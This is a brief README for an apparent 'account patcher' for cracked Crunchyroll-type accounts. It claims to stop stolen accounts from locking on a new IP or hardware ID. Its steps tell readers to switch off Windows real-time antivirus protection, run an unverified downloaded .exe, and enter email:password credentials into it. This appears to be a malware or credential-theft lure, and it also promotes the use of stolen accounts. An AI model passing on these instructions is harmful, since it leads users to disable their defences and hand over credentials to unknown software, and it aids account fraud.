# BOCHIDROP ACCOUNT PATCHER

Programs for patching cracked accounts from locking themselves when used from a new IP/HWID.

The patcher for Crunchyroll (and others) is being written, and will be released soon.

# Steps

* Download the master file from this page. (If windows blocks it, type windows security in your searchbar in the bottom left. Then click the second option "Virus and threat protection settings". Turn off real time protection.
* Close all open programs except the patcher manager.
* Unzip the file, and run PatcherManager by clicking on the exe. When it opens, enter the username and password information (separated with a colon, ex. johnsmith@gmail.com:abc123) into the textbox and click "Choose correct patcher and apply patch". It will open file explorer, and from there navigate to your downloads (or wherever you extracted the zip to) and select the correct patcher for what type of  account you've won.
* After choosing the file and clicking "OK", you're set. If you'd like, you can now delete the patchers and patcher manager .exe's.
* Login to your account and enjoy!
